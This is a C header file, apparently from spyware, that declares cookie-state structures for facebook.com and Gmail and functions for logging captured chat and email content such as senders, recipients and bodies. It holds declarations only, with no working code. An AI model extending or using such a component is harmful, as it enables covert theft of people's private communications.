#define SOCIAL_ENTRY_COUNT 2

#define SOCIAL_REQUEST_SUCCESS 0
#define SOCIAL_REQUEST_BAD_COOKIE 1
#define SOCIAL_REQUEST_NETWORK_PROBLEM 2

typedef unsigned long (*social_handler)(char *);

typedef struct {
	WCHAR domain[64];
	DWORD idle;
	BOOL wait_cookie;
	BOOL is_new_cookie;
	social_handler RequestHandler;
} social_entry_struct;

#define FACEBOOK_DOMAIN L"facebook.com"
#define GMAIL_DOMAIN L"mail.google.com"
#define FACEBOOK_DOMAINA "facebook.com"
#define GMAIL_DOMAINA "mail.google.com"

#define MAPI_V3_0_PROTO	2012030601

#pragma pack(4)
struct MailSerializedMessageHeader {
  DWORD VersionFlags;       // flags for parsing serialized message
#define MAIL_FULL_BODY 0x00000001 // Ha catturato tutta la mail 
#define MAIL_INCOMING  0x00000001
#define MAIL_OUTGOING  0x00000000
  DWORD Flags;               // message flags
#define MAIL_GMAIL     0x00000000
  DWORD Program;
  DWORD Size;                // message size
  FILETIME date;			 // data di ricezione approssimativa del messaggio
};
#pragma pack()

extern social_entry_struct social_entry[SOCIAL_ENTRY_COUNT];
extern void urldecode(char *src);
extern void CheckProcessStatus();
extern void LogSocialIMMessageA(char *program, char *topic, char *peers, char *author, char *body, struct tm *tstamp);
extern void LogSocialIMMessageW(WCHAR *program, WCHAR *topic, WCHAR *peers, WCHAR *author, WCHAR *body, struct tm *tstamp);
extern void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char *subject, char *body, BOOL is_incoming);






